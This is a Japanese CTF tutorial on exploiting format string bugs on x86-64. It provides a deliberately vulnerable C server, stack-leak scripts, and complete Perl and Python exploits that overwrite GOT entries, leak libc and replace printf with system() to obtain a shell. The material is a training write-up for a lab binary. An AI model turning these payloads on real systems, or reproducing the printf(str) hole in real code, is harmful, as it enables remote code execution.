# Pwn解説 FSB 2回目 (x86-64の場合)

## 例題
```
CTFで出題されるfsb関連の問題は概ね次の3パターンに分類される

a. スタックを利用して単純にフラグをリークするだけの問題
b. 実行ファイル内の関数/gadgetsを呼び出してフラグを参照する問題
c. シェル起動まで行う問題

aは%p,%x,%sでリークするだけなのでbとcを中心に次の例題を使って以降解説する。cでaのリークも行うので、cの解説時にaの説明を行う

$ cat fsb.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

static void show_flag()
{
        char buf[100] = {0};
        int fd = open("./flag", 0);
        read(fd, buf, sizeof(buf)-1);
        printf("Congrats! %s\n", buf);
}

static void vuln(char *str)
{
        printf(str);
        puts("bye");
}

int main(int argc, char **argv)
{
        char buf[256] = {0};
        setvbuf(stdout, 0, _IONBF, 0);
        write(1, "Hello! Can you tell me your name?\n", 34);
        if (read(0, buf, sizeof(buf) - 1) <= 0) exit(EXIT_FAILURE);
        vuln(buf);
        return 0;
}

コンパイル
# gcc -no-pie -o fsb fsb.c

フラグ生成
# echo FLAG_GGGGGGGGGGGGGGGGGGGGGG > flag
# echo FLAG_ZZZZZZZZZZZZZZZZZZZZZZ > flag2

サーバ起動
# socat TCP-LISTEN:5000,reuseaddr,fork EXEC:./fsb
x86との違いは一つ。
x86-64の場合はアドレスに0x00が混ざる★

■x86の場合のアドレス配置
$ gdb -q fsb -ex start -ex vmmap -ex q
Start      End        Perm      Name
0x08048000 0x08049000 r-xp      /home/guru/work/fsb/fsb
0x08049000 0x0804a000 r--p      /home/guru/work/fsb/fsb
0x0804a000 0x0804b000 rw-p      /home/guru/work/fsb/fsb
0xf7e11000 0xf7fc5000 r-xp      /lib/i386-linux-gnu/libc-2.21.so

■x86-64の場合のアドレス配置
$ gdb -q fsb -ex start -ex vmmap -ex q
Start              End                Perm      Name
0x00400000         0x00401000         r-xp      /home/guru/work/fsb02/fsb
0x00600000         0x00601000         r--p      /home/guru/work/fsb02/fsb
0x00601000         0x00602000         rw-p      /home/guru/work/fsb02/fsb
0x00007ffff7a0f000 0x00007ffff7bcf000 r-xp      /lib/x86_64-linux-gnu/libc-2.21.so

=>x86のときは入力の先頭にアドレスを埋め込んでいたが、x86-64では通用しないケースが多い
   fgets(3)などでは0x00で処理が打ち切られてしまうため工夫が必要
```

## 解法1 - 実行ファイル内の関数/gadgetsの呼び出し
```

解析
$ pwn.sh fsb
fsb: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=d8dd636632dcfcdf5a2edd18021ef480fb60019c, not stripped
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   75 Symbols     Yes      0               4       fsb

ソースコード中の呼ばれていない関数show_flag()を呼び出せたら勝ち
vuln()関数にfsbの脆弱性あり。　printf(str);　★慣れると逆アセンブルした結果のみでfsbの脆弱性があると分かるようになる　＃あとで逆アセンブルした結果も見ておいてください
↓
fsbの脆弱性を利用して、puts@GOTをshow_flag()のアドレスで上書きして攻略すればよい

$ objdump -d -Mintel fsb | grep show_flag
0000000000400796 <show_flag>:
$ grep show_flag fsb.disas
0000000000400796 <show_flag>:
$ python -c 'print(0x0796)'
1942

$ readelf -r fsb| grep puts
000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 puts + 0
$ grep puts info
000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 puts + 0

printf(3)はputs(3)の前に呼び出されるので、printf(3)を呼び出したタイミングではputs(3)のアドレス解決が行われていない

$ gdb -q fsb -ex start -ex vmmap -ex q
Temporary breakpoint 1, 0x0000000000400850 in main ()
Start              End                Perm      Name
0x00400000         0x00401000         r-xp      /home/guru/work/fsb02/fsb
0x00600000         0x00601000         r--p      /home/guru/work/fsb02/fsb
0x00601000         0x00602000         rw-p      /home/guru/work/fsb02/fsb　★アドレスに必ず0x00が混ざる
0x00007ffff7a0f000 0x00007ffff7bcf000 r-xp      /lib/x86_64-linux-gnu/libc-2.21.so

gdb-peda$ telescope 0x00601000 0x80
0000| 0x601000 --> 0x600e28 --> 0x1
0008| 0x601008 --> 0x7ffff7ffe188 --> 0x0
0016| 0x601010 --> 0x7ffff7defed0 (<_dl_runtime_resolve>:       sub    rsp,0x78)
0024| 0x601018 --> 0x400606 (<puts@plt+6>:      push   0x0) ★まだアドレス解決されていない（余談だがアドレス解決されていてもputs@plt+6のアドレスを入れておくと再度アドレス解決させることができる. Return-to-dl-resolveで使うことがある）
0032| 0x601020 --> 0x7ffff7b064d0 (<write>:     cmp    DWORD PTR [rip+0x2d27a9],0x0        # 0x7ffff7dd8c80 <__libc_multiple_threads>)
0040| 0x601028 --> 0x400626 (<__stack_chk_fail@plt+6>:  push   0x2)
0048| 0x601030 --> 0x7ffff7a63ba0 (<__printf>:  sub    rsp,0xd8)
0056| 0x601038 --> 0x7ffff7b06470 (<read>:      cmp    DWORD PTR [rip+0x2d2809],0x0        # 0x7ffff7dd8c80 <__libc_multiple_threads>)
0064| 0x601040 --> 0x7ffff7a2f950 (<__libc_start_main>: push   r14)
0072| 0x601048 --> 0x400666 (<__gmon_start__@plt+6>:    push   0x6)
0080| 0x601050 --> 0x7ffff7a80230 (<__GI__IO_setvbuf>:  push   r12)
0088| 0x601058 --> 0x400686 (<open@plt+6>:      push   0x8)
0096| 0x601060 --> 0x400696 (<exit@plt+6>:      push   0x9)

よって、末尾2バイトを更新するだけでよい。

$ ./fsb
Hello! Can you tell me your name?
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%pAAAABBBB
0x7ffdca8b52f0.0xff.0x7f0c8da1b480.(nil).0x7f0c8dcea970.0x7f0c8dcea970.0x7ffdca8b52f0.0x7ffdca8b5400.0x4008f3.0x7ffdca8b54e8.0x100000000.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.
0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x412e70252e70252e.0xa42424242414141.(nil).AAAABBBB

微調整

$ ./fsb
Hello! Can you tell me your name?
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p__AAAABBBB
0x7ffe366d5f50.0xff.0x7fdc34392480.(nil).0x7fdc34661970.0x7fdc34661970.0x7ffe366d5f50.0x7ffe366d6060.0x4008f3.0x7ffe366d6148.0x100000000.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.
0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x5f5f70252e70252e.0x4242424241414141.0xa__AAAABBBB

20番目にAAAABBBB部分がくる
バッファの先頭からアドレス埋め込み位置までのオフセットは64バイト

[攻略方針]
  1. 0x601018 を2バイト上書して0x0796=1942を埋め込む
     ↓
  2. "%1942c%20$hn...64バイト先に...${puts@GOT 8バイト}"を投入する　

%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p__AAAABBBB
%1942c%20$hn____________________________________________________\x18\x10\x60...

$ perl -e "print '%1942c%20\$hn'.\"____________________________________________________\x18\x10\x60\x00\x00\x00\x00\x00\n\";" | xxd -g 1
0000000: 25 31 39 34 32 63 25 32 30 24 68 6e 5f 5f 5f 5f  %1942c%20$hn____
0000010: 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f  ________________
0000020: 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f  ________________
0000030: 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f 5f  ________________
0000040: 18 10 60 00 00 00 00 00 0a

$ perl -e "print '%1942c%20\$hn'.\"____________________________________________________\x18\x10\x60\x00\x00\x00\x00\x00\n\";" | ./fsb
Hello! Can you tell me your name?
(snip)
                             ____________________________________________________`Congrats! FLAG_GGGGGGGGGGGGGGGGGGGGGG ★フラグ奪取成功

```

## 解法2 - シェル起動

```
フラグを得るためにはシェル起動が必要というケースもある

ASLR有効時にシェル起動はどうやるのか?

[攻略法]
  puts@GOTを_startのアドレスで上書きする(繰り返し%p/%s/%nを投入可能にする) ★この処理で繰り返し任意アドレスの読み書きが可能になる。繰り返し実行できるようになれば攻略できたも同然。ただ、CTFでは、ここが一番難しい
  ↓
  __libc_start_main@GOTのアドレスをリークする
  ↓
  system(3)のアドレスを計算する
  ↓
  １回の入力でprintf@GOT の末尾3 or 4バイトをsystem(3)のアドレスの末尾3 or 4バイトで上書きする

puts@GOTは前と同じ方法で取得可能

  $ grep puts info
  000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 puts + 0

  <別の方法>
  $ readelf -r fsb | grep puts
  000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 puts + 0

_startのアドレスは以下の方法で取得可能

  $ grep '<_start' fsb.disas
  00000000004006a0 <_start>:
  
  <別の方法>
  $ objdump -Mintel -d fsb | grep '<_start'
  00000000004006a0 <_start>:

  puts@GOTを0x06a0に変更したいので...
  $ python -c 'print(0x6a0)'
  1696

__libc_start_main@GOTのアドレスは以下の方法で取得可能

  $ grep __libc_start info
  000000601040  000600000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main + 0
  
  <別の方法>
  $ readelf -r fsb | grep  __libc_start info
  000000601040  000600000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main + 0

  取得は次の文字列を入力すればよい
  $buf = '%20$s';
  $buf.= "A" x (64-length($buf)) . p(0x601040)."\n";

system(3)のアドレスは次の方法で計算可能

  $system_addr = 取得した__libc_start_main@GOTのアドレス - $lsm_offset + $system_offset

  $ grep ' x86-64 ' -A 8 info
  -- x86-64 --
  $system_offset=0x443d0;★
  $execl_offset=0xcb2e0;
  $open_offset=0xf7260;
  $read_offset=0xf7470
  $write_offset=0xf74d0;
  $environ_offset=0x3c7218;
  $lsm_offset=0x20950;★
  $binsh_offset=0x18c3dd;
  
  <別の方法>
  $ ldd fsb
          linux-vdso.so.1 =>  (0x00007ffdb1bf6000)
          libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb71cabb000)
          /lib64/ld-linux-x86-64.so.2 (0x00007fb71ce85000)
  $ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep system
  00000000000443d0 W system
  $ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep __libc_start
  0000000000020950 T __libc_start_main

20番目にAAAABBBB部分がくるのは変わらない

  $ ./fsb
  Hello! Can you tell me your name?
  %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p__AAAABBBB
  0x7ffe366d5f50.0xff.0x7fdc34392480.(nil).0x7fdc34661970.0x7fdc34661970.0x7ffe366d5f50.0x7ffe366d6060.0x4008f3.0x7ffe366d6148.0x100000000.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.
  0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x5f5f70252e70252e.0x4242424241414141.0xa__AAAABBBB

上記を踏まえてexploitを組み立てる

■exploit (perl版)

$ cat fsb.pl
#!/usr/bin/perl
use pwntools;
use Time::HiRes qw (usleep);

$pwntools::ARCH = '64';
$lsm_offset=0x20950;
$system_offset=0x443d0;
&connect(\$s, 'localhost', 5000) or die "ng";

# overwrite puts@GOT(0x601018) with _start(0x4006a0=1696)
print &read_until($s, qr/name\?\n/, 10);
$buf = '%1696c%20$hn';
$buf.= "A" x (64-length($buf)) . p(0x601018)."\n";
syswrite($s, $buf, length($buf));

## leak lsm@GOT(0x601040)
&read_until($s, qr/name\?\n/, 10);
$buf = '%20$s';
$buf.= "A" x (64-length($buf)) . p(0x601040)."\n";
syswrite($s, $buf, length($buf));
$data = &read_until($s, qr/\n/, 10); print unpack("H*", $data)."\n";
$libc_base = u(substr($data, 0, 6)."\x00\x00")-$lsm_offset;
printf("[+] libc_base = 0x%016x\n", $libc_base);
$system_addr = $libc_base + $system_offset;

# overwrite printf@GOT(0x601030) with system(3)
#gdb-peda$ p printf
#$1 = {<text variable, no debug info>} 0x7ffff7a63ba0 <__printf>
#gdb-peda$ p system
#$2 = {<text variable, no debug info>} 0x7ffff7a533d0 <__libc_system>
$a=($system_addr & 0xff); $b=($system_addr>>8 & 0xff); $c=($system_addr>>16 & 0xff);
printf("[+] %02x > %02x > %02x ?\n", $a, $c, $b); # $a > $c > $b と想定
if ($c < $b) {
  print "ng\n"; exit 0;
}
$x = $b; $y = $c-$b; $z = $a-$c;
$buf="\%${x}c\%20\$hhn\%${y}c\%21\$hhn\%${z}c\%22\$hhn";
$buf.="A" x (64-length($buf)).p(0x601031).p(0x601032).p(0x601030)."\n";
syswrite($s, $buf, length($buf));
&read_until($s, qr/name\?\n/, 10);
print "ok\n";
&interact($s);
__END__


$ perl fsb.pl
Hello! Can you tell me your name?
50f9934bba7f414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414140106048656c6c6f212043616e20796f752074656c6c206d6520796f7572206e616d653f0a
[+] libc_base = 0x00007fba4b91f000
[+] d0 > 96 > 33 ?
ok
id
uid=0(root) gid=0(root) groups=0(root)
Hello! Can you tell me your name?
cat flag2
Hello! Can you tell me your name?

FLAG_ZZZZZZZZZZZZZ★

確率1/6(?)で解ける。　

if文を使って場合分けすると、100%の確率でシェルが取れるexploitになるが、少し手間がかかる。=>別解を考えてみる


別解: ショートライトをつかって4 or 3バイト更新

$ cat fsb2.pl
#!/usr/bin/perl
use pwntools;
use Time::HiRes qw (usleep);

$pwntools::ARCH = '64';
$lsm_offset=0x20950;
$system_offset=0x443d0;
&connect(\$s, 'localhost', 5000) or die "ng";

# overwrite puts@GOT(0x601018) with _start(0x4006a0=1696)
print &read_until($s, qr/name\?\n/, 10);
$buf = '%1696c%20$hn';
$buf.= "A" x (64-length($buf)) . p(0x601018)."\n";
syswrite($s, $buf, length($buf));

## leak lsm@GOT(0x601040)
&read_until($s, qr/name\?\n/, 10);
$buf = '%20$s';
$buf.= "A" x (64-length($buf)) . p(0x601040)."\n";
syswrite($s, $buf, length($buf));
$data = &read_until($s, qr/\n/, 10); print unpack("H*", $data)."\n";
$libc_base = u(substr($data, 0, 6)."\x00\x00")-$lsm_offset;
printf("[+] libc_base = 0x%016x\n", $libc_base);
$system_addr = $libc_base + $system_offset;
printf("[+] system_addr = 0x%016x\n", $system_addr); 

# overwrite printf@GOT(0x601030) with system(3)
#gdb-peda$ p printf
#$1 = {<text variable, no debug info>} 0x7ffff7a63ba0 <__printf>
#gdb-peda$ p system
#$2 = {<text variable, no debug info>} 0x7ffff7a533d0 <__libc_system>
$a=($system_addr & 0xff); $b=($system_addr>>8 & 0xffff); # ★変更箇所
printf("[+] 0x%02x < 0x%04x \n", $a, $b);

$buf="\%${a}c\%20\$hhn\%".int($b-$a)."c\%21\$hn";  # ★変更箇所
$buf.="A" x (64-length($buf)).p(0x601030).p(0x601031)."\n";  # ★変更箇所
syswrite($s, $buf, length($buf));
&read_until($s, qr/name\?\n/, 10);
print "ok\n";
&interact($s);
__END__
$ perl fsb2.pl
Hello! Can you tell me your name?
50a979ce047f414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414140106048656c6c6f212043616e20796f752074656c6c206d6520796f7572206e616d653f0a
[+] libc_base = 0x00007f04ce77a000
[+] system_addr = 0x00007f04ce7be3d0 ★ ASLR有効でも末尾12bitは変化しない 。0x3d0はプロセスを再起動しても変わらない
[+] 0xd0 < 0x7be3
ok
cat flag2
FLAG_ZZZZZZZZZZZZZ★

ショートライトを使うと確実にシェル起動が行えるexploitを作ることができる。分岐も不要★　

＃攻略方針を検討する際、確実にシェル起動が行える方法、楽してシェル起動が行える方法をできるだけ探しましょう。この点を意識して過去問をといていくと、ケースに合わせて楽できる方法がイメージできるようになります


■libformatstrで投入する文字列を作る場合

$ cat fsb.py
# coding:utf-8
from libformatstr import FormatStr
import sys
fmt = FormatStr(isx64=1) # インスタンスつくるときにisx64=1を指定する★
fmt[0x601030] = int(sys.argv[1],16)
payload = fmt.payload(17)
print (payload)

実行例

# python fsb.py ce7be3d0 2>/dev/null | xxd -g 1
00000000: 25 35 32 38 35 39 63 25 32 31 24 68 6e 25 35 34  %52859c%21$hn%54
00000010: 36 31 63 25 32 32 24 68 6e 41 41 41 41 41 41 41  61c%22$hnAAAAAAA
00000020: 32 10 60 00 00 00 00 00 30 10 60 00 00 00 00 00  2.`.....0.`.....

read(2)ではなくfgets(3)を使われたら難度が上がる => 別の解き方が必要になる => 次回


■python版exploit
$ cat exploit.py

from pwn import *

offset_lsm = 0x20950
offset_system = 0x443d0
lsm_got = 0x601040
puts_got = 0x601018
printf_got = 0x601030

#r = process('./fsb')
r = remote('127.0.0.1', 7777)

def sender(target, payload): target.sendlineafter('Can you tell me your name?\n', payload)

# overwrite puts@GOT with _start
"""
pwntoolsのfsbpayload生成関数fmtstr_payload()は書き込み先アドレスがpayloadの先頭に挿入されるため、アドレスに0x00が入る場合、
printfの出力が0x00で終了してしまうため、fsbが成功しない。
そのため、アドレスをpayloadの一番後ろに付与する形で、自分でpayload作成。
puts_gotの初期状態は下記のようになっており、startのアドレスは0x4006a0であるため、下位2バイトを0x6a0に書き換えるだけでよい。0x6a0=1696。
0024| 0x601018 --> 0x400606 (<puts@plt+6>:      push   0x0)
"""
payload = b'%1696c%20$hn'
payload += b'A'*(64-len(payload)) + p64(puts_got)
sender(r, payload)
log.info('overwrite puts@GOT with _start')

# leak lsm@GOT
payload = b'%20$s'
payload += b'A'*(64-len(payload)) + p64(lsm_got)
sender(r, payload)
leak_lsm = u64(r.recv(6).ljust(8, b'\x00'))
libc_base = leak_lsm - offset_lsm
log.info('leak libc: 0x{0:x}'.format(libc_base))

# overwrite printf@GOT with system(3)
system = libc_base + offset_system
# 例えば, printf:0x7f1d54593ba0, system:0x7f1d545833d0 であるため、0x33, 0x58, 0xd0の順に書き込んでいけば良い
second_lsb = (system >> 8) & 0xff
fsb_first = second_lsb
third_lsb = system >> 16 & 0xff
fsb_second = third_lsb - second_lsb
lsb = system & 0xff
fsb_third = lsb - third_lsb

payload = ('%{}c%20$hhn%{}c%21$hhn%{}c%22$hhn'.format(fsb_first, fsb_second, fsb_third)).encode()
payload += b'A'*(64-len(payload)) + p64(printf_got+1) + p64(printf_got+2) + p64(printf_got)
sender(r, payload)
r.interactive()

実行結果は以下。
$ python3 exploit.py
[+] Opening connection to 127.0.0.1 on port 7777: Done
[*] overwrite puts@GOT with _start
[*] leak libc: 0x7f9b317c1000
[*] Switching to interactive mode
                                                                                  0                                            \xff                                                                               \x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAHello! Can you tell me your name?
$ ls
flag
fsb
Hello! Can you tell me your name?
$ cat flag
flag{hogeee}


第一引数に入力文字列がくる可能性があるGOT上の次の関数のアドレスをsystem(3)のアドレスと置き換えて攻略するケースが多い

* atoi()/atol()/atoll()/strtol()/strtoll()/...
* strlen()
* strstr()
* strcmp()/strncmp()
* strdup()/strndup()
など

上記も踏まえて逆アセンブルした結果を見ていく。
慣れると攻略の流れをイメージできるようになる。出題者の意図を汲み取れるようになる

慣れるには答えのある過去問を解くのが一番！　＃ピックアップした過去問を末尾に記載します
```

## 参考: スタックのリーク
```

スタックの中身をごっそり出力して、攻略方針を検討することもある。

スクリプトの例を以下に記載する。　x86の場合とまったく同じでよい

$ cat leak.pl
use pwntools;
use Time::HiRes qw (usleep);
# leak stack segment
foreach (1..150) { # 150-300回リークすれば大体argc, argv, envp付近まで到達可能★
  &connect(\$s, 'localhost', 5000) or die "ng";
  &read_until($s, qr/name\?\n/, 10);
  $buf="\%$_\$p"; $buf.="_" x (50-length($buf))."\n";
  syswrite($s, $buf, length($buf));
  $data = &read_until($s, qr/\n/, 10);# print $data;
  $data =~ /(\S+)\_/ && do { printf("%03d: %s\n", $_, $1) ; };
  close($s);
}
__END__

みるべきポイントは？=>リターンアドレス、カナリア値、環境変数、argc/argv、stack（rsp）付近のアドレス、heap付近のアドレス、bss付近のアドレス、libcのアドレス

スタックの配置はローカルもリモートも基本同じ（異なることもあるが、CTFで発生するケースは稀）。相対的にどの位置にどの値がくるか、gdbを使って見比べてみるのがよい

# perl leak.pl
(snip)
041: (nil)____________________________________________
042: (nil)____________________________________________
043: (nil)____________________________________________
044: 0x7fff050016d0____________________________________________ ★stack (rsp)付近
045: 0x552c45ce704c6900____________________________________________ ★カナリア値
046: 0x400910____________________________________________  
047: 0x7f5174d95a40____________________________________________ ★リターンアドレス、libc付近
048: 0x7ffe5bcd40e8____________________________________________
049: 0x7ffe71a2bd68____________________________________________
050: 0x100000000____________________________________________
051: 0x40084c____________________________________________　★ベースアドレス/bss付近
052: (nil)____________________________________________
053: 0xe74eb04762d96bb1____________________________________________
054: 0x4006a0____________________________________________
055: 0x7fffc3540030____________________________________________
056: (nil)____________________________________________
057: (nil)____________________________________________
058: 0xd0b56a4a065b7601____________________________________________
059: 0x6ea5d01d6fe3a3a____________________________________________
060: (nil)____________________________________________
061: (nil)____________________________________________
062: (nil)____________________________________________
063: 0x400910____________________________________________
064: 0x7ffc37e97db8____________________________________________
065: 0x1____________________________________________
066: (nil)____________________________________________
067: (nil)____________________________________________
068: 0x4006a0____________________________________________
069: 0x7fff45df3a40____________________________________________
070: (nil)____________________________________________
071: 0x4006c9____________________________________________
072: 0x7ffc73f6d358____________________________________________
073: 0x1c____________________________________________
074: 0x1____________________________________________ ★argc
075: 0x7ffd1d9dc7dd____________________________________________ ★argv
076: (nil)____________________________________________
077: 0x7ffd087d77e3____________________________________________ ★envp　環境変数
078: 0x7ffdb20d47f9____________________________________________
079: 0x7fff508d0819____________________________________________

gdb-peda$ telescope 0x7fffffffe538-0x20 0x100
0000| 0x7fffffffe518 --> 0x0
0008| 0x7fffffffe520 --> 0x7fffffffe610 --> 0x1
0016| 0x7fffffffe528 --> 0x73c3ad58398e5700
0024| 0x7fffffffe530 --> 0x400910 (<__libc_csu_init>:   push   r15)
0032| 0x7fffffffe538 --> 0x7ffff7a2fa40 (<__libc_start_main+240>:       mov    edi,eax)
0040| 0x7fffffffe540 --> 0x7fffffffe618 --> 0x7fffffffe82b ("/home/guru/work/fsb02/fsb")
0048| 0x7fffffffe548 --> 0x7fffffffe618 --> 0x7fffffffe82b ("/home/guru/work/fsb02/fsb")
0056| 0x7fffffffe550 --> 0x100000000
0064| 0x7fffffffe558 --> 0x40084c (<main>:      push   rbp)
0072| 0x7fffffffe560 --> 0x0
0080| 0x7fffffffe568 --> 0x21465b25de346eb7
0088| 0x7fffffffe570 --> 0x4006a0 (<_start>:    xor    ebp,ebp)
0096| 0x7fffffffe578 --> 0x7fffffffe610 --> 0x1
0104| 0x7fffffffe580 --> 0x0
0112| 0x7fffffffe588 --> 0x0
0120| 0x7fffffffe590 --> 0xdeb9a45a06946eb7
0128| 0x7fffffffe598 --> 0xdeb9b4e03fe46eb7
0136| 0x7fffffffe5a0 --> 0x0
0144| 0x7fffffffe5a8 --> 0x0
0152| 0x7fffffffe5b0 --> 0x0
0160| 0x7fffffffe5b8 --> 0x400910 (<__libc_csu_init>:   push   r15)
0168| 0x7fffffffe5c0 --> 0x7fffffffe618 --> 0x7fffffffe82b ("/home/guru/work/fsb02/fsb")
0176| 0x7fffffffe5c8 --> 0x1
0184| 0x7fffffffe5d0 --> 0x0
0192| 0x7fffffffe5d8 --> 0x0
0200| 0x7fffffffe5e0 --> 0x4006a0 (<_start>:    xor    ebp,ebp)
0208| 0x7fffffffe5e8 --> 0x7fffffffe610 --> 0x1
0216| 0x7fffffffe5f0 --> 0x0
0224| 0x7fffffffe5f8 --> 0x4006c9 (<_start+41>: hlt)
0232| 0x7fffffffe600 --> 0x7fffffffe608 --> 0x1c
0240| 0x7fffffffe608 --> 0x1c
0248| 0x7fffffffe610 --> 0x1
0256| 0x7fffffffe618 --> 0x7fffffffe82b ("/home/guru/work/fsb02/fsb")
0264| 0x7fffffffe620 --> 0x0
0272| 0x7fffffffe628 --> 0x7fffffffe845 ("PYENV_ROOT=/opt/ctf/tools/pyenv")
0280| 0x7fffffffe630 --> 0x7fffffffe865 ("TERM=xterm")
0288| 0x7fffffffe638 --> 0x7fffffffe870 ("SHELL=/bin/bash")
```

## 参考: gdbを用いてメモリ上の値を微調整する方法

```
しばしば思い通りにメモリの値を上書きできないことがある。シェルが起動できない場合、例えば次のような方法でgdbを使って微調整を行う

1. exploitの処理を途中まで進めて、printf@got上書き前に標準入力待ちにして止める

   <例>  標準入力待ちにする方法
   pythonの場合: z = input()
   perl の場合   : a = <STDIN>;

   $ perl fsb2.pl
   Hello! Can you tell me your name?
  5079de3f817f414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414140106048656c6c6f212043616e20796f752074656c6c206d6520796f7572206e616d653f0a
   [+] libc_base = 0x00007f813fdc7000
   [+] system_addr = 0x00007f813fe0b3d0
   [+] 0xd0 < 0xe0b3

2. 別端末でgdbを使ってプロセスfsbにアタッチして、printfあたりにbpを仕掛けてcontinueする

   # gdb -q -p `pidof -s fsb` -ex 'b printf' -ex c

3. exploit側でEnterキーを押す

4. gdb側でfinish/finなどを入力して関数を進め、printf@gotが上書きされるまで進める。

   gdb-peda$ finish 

5. 更新後のprintf@gotを確認する

   gdb-peda$ telescope 0x601000
   0000| 0x601000 --> 0x600e28 --> 0x1
   0008| 0x601008 --> 0x7f81403b6188 --> 0x0
   0016| 0x601010 --> 0x7f81401a7ed0 (<_dl_runtime_resolve>:       sub    rsp,0x78)
   0024| 0x601018 --> 0x4006a0 (<_start>:  xor    ebp,ebp)
   0032| 0x601020 --> 0x7f813febe4d0 (<write>:     cmp    DWORD PTR [rip+0x2d27a9],0x0   
   0040| 0x601028 --> 0x400626 (<__stack_chk_fail@plt+6>:  push   0x2)
   0048| 0x601030 --> 0x7f813fe0b3d0 (<__libc_system>:     test   rdi,rdi)
```

## 過去事例

```
SharifCTF - Guess 50 blind fsb 難度低★ パターンa
UIUCTF 2017 - goodluck 200 ワンライナー、stackにフラグ有 難度低★ パターンa
3DSCTF 2016 - level 4 - echoindiapapa 400 ワンライナー、fsb 難度低★ パターンb
ASIS CTF Finals 2017 - Mary Morton 500 カナリア値リーク、bof 難度中★ パターンb
ASIS CTF Finals 2017 - Greg Lestrade 500 認証突破、fsbでリターンアドレス上書き 難度中★ パターンb
VolgaCTF 2016 Quals - Web of Science 3 400 問題に辿り着くためにsha1のガード突破が必要、fsb、ASLR有効、DEP有効、/bin/sh->/bin/true、fd=4でopen+read+write 難度中★ パターンb
HackIM - Exploitation Question 1 200 難度低★ パターンc
angstromCTF - To-Do List 140 strcmp@got置換 難度中★ パターンc
VolgaCTF - Time Is 150 %N$使用不可、カナリア値リーク、bof 難度中★ パターンc
Insomnihack teaser 2017 - baby 50 Full RELRO、socket/bind/listen/accept、fsb、leak canary、bof 難度中★ パターンc
ASIS CTF Finals 2017 - Mycroft Holmes 500 Game系、要libc特定、GOT上書き 難度中★ パターンc
VolgaCTF 2016 Quals - Web of Science 2 350 fsb、ASLR無効、DEP有効、メニュー増加、OneGadgetRCE 難度中★ パターンc
パターンaとパターンbはwarmup問題として出題されることがある。出題数はパターンcが最も多い。パターンaとパターンbの出題数は年々減少してきており、2019年7月現在では、ほとんど見かけなくなった。

fsb関連の問題は、ASLR, Full RELRO、PIEなどのガードがかかっていも、接続を維持したまま、繰り返しfsbの脆弱性をつく文字列を投入可能にできれば勝ちとなる。
ただ、繰り返し実行まで持ち込めないよう作問側は工夫してくる。過去問で慣れておく必要有
```

## fsb問題 攻略の流れ(概要)
```

1. 逆アセンブル/逆コンパイルした結果から、fsbの脆弱性を見つける
   パターンa / パターンb / パターンc のどれに当てはまるか、可能な範囲で確認する

2. アドレスを埋め込む位置を調べる
   入力値
   x86の場合   : AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
   x86-64の場合: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%pAAAABBBB
   x86-64の場合は、アドレスに0x00が混ざるため、アドレスの埋め込み位置は末尾にすることが多い

3. 逆アセンブルした結果、スタックの値をリークした結果、デバッガで確認したスタックの配置(リターンアドレス、カナリア値、...）を見て攻め方を決める
   パターンcの場合はoneshot系（1回の入力で攻めきるタイプ)か否かも確認する　(問題名から推測できるケースが多い 例: oneshot 、silver bullet)

4. oneshot系の場合は、partial overwrite(1～3バイト更新)、もしくは4バイトか8バイトを1回の入力で上書きしてシェル起動を狙う（シェル起動ができたら攻略完了）
    oneshot系でない場合は、繰り返し入力可能になるようメモリを更新する

5. 繰り返し入力可能になったらlibc_baseを特定する

6. シェル起動につながるようfsbの脆弱性を利用してメモリを上書きする

   x86の場合はsystem("/bin/sh")の呼び出しで攻略することが多い
   x86-64の場合はOne Gadget RCEで攻略することが多い
   楽できる方法を選択して攻略する

　＃6は↑の過去問および後述する特殊系の問題を解いて慣れておく必要があるかもしれません。
```

## コメント
``` 
%N$のガード有りの場合と同様、%nが使えないケースもあります。その場合、メモリのリークで攻略できることがあります。外れの場合、カナリア値リーク＋BOFで攻略する問題の可能性があります。とりあえず２点確認してみるのがお奨めです
``` 
